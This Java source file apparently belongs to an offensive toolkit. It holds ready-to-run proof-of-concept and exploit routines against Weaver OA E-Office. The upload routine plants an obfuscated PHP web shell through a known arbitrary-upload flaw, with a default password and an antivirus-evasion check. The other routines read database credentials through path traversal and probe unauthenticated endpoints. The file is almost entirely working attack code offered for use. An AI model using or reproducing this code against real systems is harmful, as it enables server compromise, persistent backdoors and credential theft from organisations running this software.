package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.achuna33.Utils.Utils;
import sun.security.krb5.internal.crypto.Des;

import java.net.MalformedURLException;

@BasicMapping(uri ="泛微OA E-Office")
public class WeaverEOfficeController  extends Controller implements BasicController{
    @VulnerabilityDescriptionMapping(Description="泛微OA E-Office UploadFile.php 任意文件上传漏洞 CNVD-2021-49104" ,SupportVulType= SupportVul.UploadFile)
    public void vul_UploadFile(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=";
        String data = "--e64bdf16c554bbc109cecef6451c26a4\r\n" +
                "Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                "shellcode\r\n" +
                "\r\n" +
                "--e64bdf16c554bbc109cecef6451c26a4--\r\n";
        switch (type){
            case EXP:
                String path = null;
                String mypayload = null;
                try {
                    path = (String) args[0];
                    try {
                        byte[] bytes = Utils.readFile(path);
                        mypayload = new String(bytes);
                    }catch (Exception e){
                        WriteExpLog("\n [*] 文件读取失败");
                    }
                }catch (Exception e){

                }
                String payload = "<?php \n" +
                        "class YXBX { \n" +
                        "    function oSpp() {\n" +
                        "        $aXNZ = \"\\xc3\" ^ \"\\xa2\";\n" +
                        "        $yjrX = \"\\xc4\" ^ \"\\xb7\";\n" +
                        "        $rIEv = \"\\x65\" ^ \"\\x16\";\n" +
                        "        $LBCL = \"\\xb0\" ^ \"\\xd5\";\n" +
                        "        $PUlT = \"\\x5a\" ^ \"\\x28\";\n" +
                        "        $abCJ = \"\\x7\" ^ \"\\x73\";\n" +
                        "        $YQCe =$aXNZ.$yjrX.$rIEv.$LBCL.$PUlT.$abCJ;\n" +
                        "        return $YQCe;\n" +
                        "    }\n" +
                        "    function __destruct(){\n" +
                        "        $jfLL=$this->oSpp();\n" +
                        "        @$jfLL($this->dm);\n" +
                        "    }\n" +
                        "}\n" +
                        "$yxbx = new YXBX();\n" +
                        "@$yxbx->dm = isset($_GET['id'])?base64_decode($_POST['weaver']):$_POST['weaver'];\n" +
                        "?>\n";

                if (mypayload!=null){
                    payload = mypayload;
                }else {
                    WriteExpLog("\n [*] 默认shell 密码为: weaver");
                }
                HttpRequest httpRequest3 = new HttpRequest(target+url);
                httpRequest3.addHeaders("Content-Type","multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4");
                data = data.replace("shellcode",payload);

                httpRequest3.Post(data);

                Response result1 = new HttpRequest(target +"/images/logo/logo-eoffice.php").Get("");
                if(result1.statusCode==200){
                    WriteExpLog("\n[*] shell path:\n"+target +"/images/logo/logo-eoffice.php");
                }else {
                    WriteExpLog("\n 访问失败:\n"+target +"/images/logo/logo-eoffice.php");
                    WriteExpLog("\n 请验证POC 可靠性 或 EXP免杀性");
                }
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                data = data.replace("shellcode","<?php phpinfo();?>");
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4");
                httpRequest.Post(data);
                Response result = new HttpRequest(target+"/images/logo/logo-eoffice.php").Get("");

                if(result.statusCode==200 && result.responseBody.toLowerCase().contains("phpinfo")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+url );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }

    @VulnerabilityDescriptionMapping(Description = "泛微OA E-Office officeserver.php 任意文件读取漏洞" ,SupportVulType = SupportVul.信息泄露)
    public void vul_officeserver信息泄露(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("password")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+"/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini" );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微OA E-Office UserSelect 未授权访问漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_UserSelect信息泄露(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/UserSelect/";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 ){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+"/UserSelect/" );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_mysql_config(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String url = "/mysql_config.ini";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("password")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+url );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
}
